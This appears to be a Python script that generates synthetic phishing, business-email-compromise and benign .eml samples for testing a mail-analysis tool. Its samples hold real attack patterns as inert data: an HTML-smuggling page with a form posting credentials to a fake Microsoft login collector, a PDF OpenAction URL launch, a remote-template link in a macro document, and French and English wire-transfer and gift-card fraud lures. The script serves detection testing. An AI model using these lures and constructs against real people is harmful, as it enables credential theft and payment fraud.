"""
Build synthetic mail samples (phishing, BEC, benign) for manual testing and
automated tests. Nothing here is real malware: the "payloads" are random bytes
or empty structures that only trigger the static heuristics.

    .venv\\Scripts\\python.exe samples\\synthetic\\make_samples.py [out_dir]
"""

from __future__ import annotations

import base64
import io
import os
import sys
import zipfile

import idna

# Real punycode of an accented lookalike of interne.fr (intérne-fr.co)
PUNY_LOOKALIKE = idna.encode("intérne-fr.co").decode("ascii")
from email import policy
from email.message import EmailMessage
from email.utils import formatdate, make_msgid


def docm_with_macro() -> bytes:
    b = io.BytesIO()
    z = zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED)
    z.writestr(
        "[Content_Types].xml",
        '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>',
    )
    z.writestr(
        "_rels/.rels",
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>',
    )
    z.writestr(
        "word/document.xml",
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Please enable content to view this invoice.</w:t></w:r></w:p></w:body></w:document>',
    )
    z.writestr(
        "word/_rels/document.xml.rels",
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>',
    )
    z.writestr(
        "word/_rels/settings.xml.rels",
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://cdn-update-templates.top/t.dotm" TargetMode="External"/></Relationships>',
    )
    z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 1024)
    z.close()
    return b.getvalue()


def html_smuggle() -> bytes:
    payload = base64.b64encode(b"PK\x03\x04" + os.urandom(3000)).decode()
    return (
        "<html><head><title>Microsoft OneDrive - Sign in to view document</title></head><body>"
        f'<script>var b64="{payload}";var bin=atob(b64);var arr=new Uint8Array(bin.length);'
        "for(var i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);"
        'var blob=new Blob([arr],{type:"application/octet-stream"});var a=document.createElement("a");'
        'a.href=URL.createObjectURL(blob);a.download="Invoice_2026.zip";document.body.appendChild(a);a.click();</script>'
        '<form action="https://login-microsoft0nline.web.app/collect.php" method="post">Email '
        '<input type="email" name="email" value="j.dupont@interne.fr"> Password <input type="password" name="pwd">'
        '<input type="submit"></form></body></html>'
    ).encode()


def pdf_js() -> bytes:
    return (
        b"%PDF-1.7\n"
        b'1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.launchURL\\("http://185.220.101.4/doc.php", true\\);) >> >> endobj\n'
        b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
        b"3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [4 0 R] >> endobj\n"
        b"4 0 obj << /Type /Annot /Subtype /Link /Rect [100 700 300 720] /A << /S /URI /URI (https://bit.ly/3xyzdoc) >> >> endobj\n"
        b"xref\n0 5\ntrailer << /Root 1 0 R /Size 5 >>\nstartxref\n0\n%%EOF"
    )


def mail(
    frm: str, to: str, subject: str, text: str, html: str | None = None, attachments=(), extra_headers=(), reply_to: str | None = None, date: str | None = None
) -> bytes:
    m = EmailMessage(policy=policy.SMTP)
    m["From"] = frm
    m["To"] = to
    m["Subject"] = subject
    m["Date"] = date or formatdate(localtime=False)
    m["Message-ID"] = make_msgid(domain="mail.example.net")
    if reply_to:
        m["Reply-To"] = reply_to
    for k, v in extra_headers:
        m[k] = v
    m.set_content(text)
    if html:
        m.add_alternative(html, subtype="html")
    for name, data, maintype, subtype in attachments:
        m.add_attachment(data, maintype=maintype, subtype=subtype, filename=name)
    return m.as_bytes()


RECEIVED_BAD = [
    ("Return-Path", "<bounce@mail-delivery-notify.xyz>"),
    ("Received", "from mail.interne.fr (mail.interne.fr [10.0.0.25]) by mx.interne.fr with ESMTP id 8Fk2; Tue, 01 Sep 2026 22:14:03 +0000"),
    (
        "Received",
        "from smtp-out.mail-delivery-notify.xyz (unknown [185.220.101.4]) by mail.interne.fr with ESMTP id 7Ab1 for <j.dupont@interne.fr>; Tue, 01 Sep 2026 22:13:58 +0000",
    ),
    ("Received", "from [192.168.1.50] (localhost [127.0.0.1]) by smtp-out.mail-delivery-notify.xyz with ESMTPA id 1; Tue, 01 Sep 2026 22:13:40 +0000"),
    (
        "Authentication-Results",
        "mx.interne.fr; spf=fail (sender IP is 185.220.101.4) smtp.mailfrom=mail-delivery-notify.xyz; dkim=none; dmarc=fail action=none header.from=interne-fr.co",
    ),
    ("X-Mailer", "PHPMailer 6.1.4 (https://github.com/PHPMailer/PHPMailer)"),
    ("X-Priority", "1"),
]

SPOOF_HTML = (
    "<html><body><p>Bonjour Jean,</p><p>Je suis en r&eacute;union et je ne peux pas t'appeler. Merci de traiter le "
    "<b>virement</b> de la facture ci-jointe imm&eacute;diatement, c'est confidentiel.</p>"
    '<p><a href="http://185.220.101.4/portal/login.php?u=j.dupont@interne.fr">https://portal.interne.fr/factures</a></p>'
    '<span style="font-size:0;color:#ffffff">lorem ipsum salt words hidden</span>'
    '<img src="http://track.mail-delivery-notify.xyz/open.gif?id=42" width="1" height="1"></body></html>'
)


def build(out: str) -> list[str]:
    os.makedirs(out, exist_ok=True)
    samples: dict[str, bytes] = {}
    samples["01-ceo-spoof-macro.eml"] = mail(
        '"Marie Lefevre" <marie.lefevre@interne-fr.co>',
        "j.dupont@interne.fr",
        "URGENT: facture a regler avant 18h",
        "Bonjour Jean,\n\nJe suis en reunion et je ne peux pas t'appeler. Merci de traiter le virement de la facture ci-jointe immediatement, c'est confidentiel.\nNouveau RIB en piece jointe.\n\nMarie",
        html=SPOOF_HTML,
        attachments=[
            ("Facture_09-2026.docm", docm_with_macro(), "application", "vnd.ms-word.document.macroEnabled.12"),
            ("Document.html", html_smuggle(), "text", "html"),
        ],
        extra_headers=RECEIVED_BAD,
        reply_to="marie.lefevre.dg@gmail.com",
        date="Tue, 01 Sep 2026 22:13:40 +0000",
    )
    samples["02-legit-ceo.eml"] = mail(
        '"Marie Lefevre" <marie.lefevre@interne.fr>',
        "j.dupont@interne.fr",
        "Point hebdo",
        "Bonjour Jean, on se voit jeudi pour le point hebdo. Marie",
        extra_headers=[
            (
                "Received",
                "from EXCH01.interne.fr (10.0.0.12) by EXCH02.interne.fr (10.0.0.13) with Microsoft SMTP Server id 15.2; Tue, 01 Sep 2026 09:02:11 +0000",
            ),
            ("Authentication-Results", "mx.interne.fr; spf=pass smtp.mailfrom=interne.fr; dkim=pass header.d=interne.fr; dmarc=pass header.from=interne.fr"),
        ],
        date="Tue, 01 Sep 2026 09:02:10 +0000",
    )
    samples["03-giftcard-bec.eml"] = mail(
        '"Marie Lefevre" <ceo.office.2026@gmail.com>',
        "j.dupont@interne.fr",
        "Are you at your desk?",
        "Hi Jean, I need you to buy 5 Apple gift cards of 100 EUR each for a client today. Scratch the cards and send me the codes. I am in a meeting, cannot talk. Keep this between us. Thanks, Marie",
        extra_headers=[
            (
                "Received",
                "from mail-sor-f41.google.com (mail-sor-f41.google.com [209.85.220.41]) by mx.interne.fr with ESMTPS id 3; Wed, 02 Sep 2026 07:45:00 +0000",
            ),
            ("Authentication-Results", "mx.interne.fr; spf=pass smtp.mailfrom=gmail.com; dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"),
        ],
        reply_to=f"marie@{PUNY_LOOKALIKE}",
        date="Wed, 02 Sep 2026 07:44:58 +0000",
    )
    b = io.BytesIO()
    z = zipfile.ZipFile(b, "w")
    z.writestr("Scan_Invoice.pdf.exe", b"MZ" + b"\x00" * 400 + b"This program cannot be run in DOS mode")
    z.close()
    samples["04-dhl-pdf-zip.eml"] = mail(
        '"DHL Express" <notification@dhl-express-delivery.top>',
        "j.dupont@interne.fr",
        "Your parcel is on hold - customs fee required",
        "Your package could not be delivered. Pay the customs fee within 24 hours: http://dhl-express-delivery.top/pay?id=8812",
        attachments=[("Shipping_Document.pdf", pdf_js(), "application", "pdf"), ("Invoice.zip", b.getvalue(), "application", "zip")],
        extra_headers=[
            (
                "Received",
                "from vps-4412.hostingprovider.ru (vps-4412.hostingprovider.ru [45.155.205.33]) by mx.interne.fr with ESMTP id 9; Wed, 02 Sep 2026 03:12:00 +0000",
            ),
            ("Received-SPF", "softfail (mx.interne.fr: domain of dhl-express-delivery.top does not designate 45.155.205.33 as permitted sender)"),
        ],
        date="Wed, 02 Sep 2026 03:11:30 +0000",
    )
    samples["05-newsletter.eml"] = mail(
        '"Tech Weekly" <news@techweekly-mail.com>',
        "j.dupont@interne.fr",
        "This week in security",
        "Read the latest articles: https://techweekly-mail.com/issue/42\nUnsubscribe: https://techweekly-mail.com/unsub?u=abc",
        extra_headers=[
            ("List-Id", "<news.techweekly-mail.com>"),
            ("List-Unsubscribe", "<https://techweekly-mail.com/unsub?u=abc>"),
            ("X-Mailer", "Mailchimp Mailer"),
            ("Received", "from mail12.sendgrid.net (mail12.sendgrid.net [167.89.0.12]) by mx.interne.fr with ESMTPS id 4; Mon, 31 Aug 2026 10:00:00 +0000"),
            ("Authentication-Results", "mx.interne.fr; spf=pass smtp.mailfrom=bounce.techweekly-mail.com; dkim=pass header.d=techweekly-mail.com; dmarc=pass"),
        ],
        date="Mon, 31 Aug 2026 09:59:30 +0000",
    )
    for name, data in samples.items():
        with open(os.path.join(out, name), "wb") as fh:
            fh.write(data)
    names = sorted(samples)
    with open(os.path.join(out, "mailbox.mbox"), "wb") as mb:
        for n in names:
            mb.write(b"From sender@example.com Tue Sep 01 22:13:40 2026\n" + samples[n].replace(b"\r\n", b"\n").rstrip(b"\n") + b"\n\n")
    with zipfile.ZipFile(os.path.join(out, "emls.zip"), "w") as zf:
        for n in names:
            zf.writestr(f"Inbox/{n}", samples[n])
    return names + ["mailbox.mbox", "emls.zip"]


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else os.path.dirname(os.path.abspath(__file__))
    print("written:", build(target))
